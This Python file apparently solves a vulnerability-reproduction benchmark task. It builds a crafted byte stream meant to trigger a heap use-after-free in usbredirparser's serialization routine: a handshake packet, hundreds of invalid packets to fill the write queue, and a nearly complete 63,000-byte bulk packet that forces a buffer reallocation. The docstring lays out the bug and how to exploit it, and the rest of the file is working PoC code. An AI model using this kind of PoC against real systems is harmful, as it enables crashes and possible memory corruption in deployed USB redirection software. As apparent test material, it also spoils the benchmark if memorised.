import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in usbredirparser.
        
        The vulnerability exists in `serialize_data`. It saves `parser->buf` (buffered read data)
        and then `parser->write_buf_count`. A pointer to `write_buf_count` in the serialization
        buffer is taken. Then the write buffers are serialized. If the write buffers cause the
        serialization buffer to reallocate, the `write_buf_count` pointer becomes a dangling pointer
        to freed memory. A subsequent write to this pointer causes the crash.
        
        Strategy:
        1. Send a HELLO packet to initialize the parser state.
        2. Send many invalid packets. Each causes the parser to queue a STATUS packet response.
           Assuming the harness simulates a blocked write or flow control, these accumulate in the
           write buffer list.
        3. Send a large packet header followed by incomplete data. This causes the parser to
           buffer the incoming data in `parser->buf`.
        
        During serialization:
        - `parser->buf` (large) is written, filling most of the default 64KB buffer.
        - `write_buf_count` pointer is taken.
        - Write buffers (from step 2) are written, forcing the buffer to grow (realloc).
        - UAF occurs when writing the count back to the old pointer.
        """
        
        # USBRedir protocol constants
        USB_REDIR_HELLO = 1
        USB_REDIR_BULK_DATA = 13
        USB_REDIR_INVALID = 0x7FFFFFFF  # Invalid type to trigger STATUS response
        
        poc = bytearray()
        
        # 1. HELLO Packet
        # Standard handshake to ensure parser is happy.
        # Header: Type=1, Length=64, ID=0, Padding=0
        hello_len = 64
        version_string = b"usbredir-host-0.0.1"
        hello_body = version_string.ljust(hello_len, b'\x00')
        
        poc.extend(struct.pack('<IIII', USB_REDIR_HELLO, hello_len, 0, 0))
        poc.extend(hello_body)
        
        # 2. Generate Write Buffers
        # Send invalid packets to trigger automatic STATUS responses (approx 20 bytes each).
        # We need enough write data to tip the total serialized size over 64KB when combined
        # with the buffered read data.
        # 450 packets * 16 bytes input -> 450 * 20 bytes output = 9000 bytes write buffer.
        num_triggers = 450
        for i in range(num_triggers):
            # Type=Invalid, Length=0, ID=unique, Padding=0
            poc.extend(struct.pack('<IIII', USB_REDIR_INVALID, 0, i + 1, 0))
            
        # 3. Large Partial Packet (Buffered Read Data)
        # Send a packet with a large declared length, but provide one byte less than declared.
        # This forces the parser to keep the data in `parser->buf`.
        # We aim for ~63KB to fill the serialization buffer (default 64KB) almost entirely.
        large_len = 63000
        
        # Header: Type=BULK_DATA (13), Length=large_len, ID=9999, Padding=0
        poc.extend(struct.pack('<IIII', USB_REDIR_BULK_DATA, large_len, 9999, 0))
        
        # Body: Provide all but 1 byte
        poc.extend(b'A' * (large_len - 1))
        
        return bytes(poc)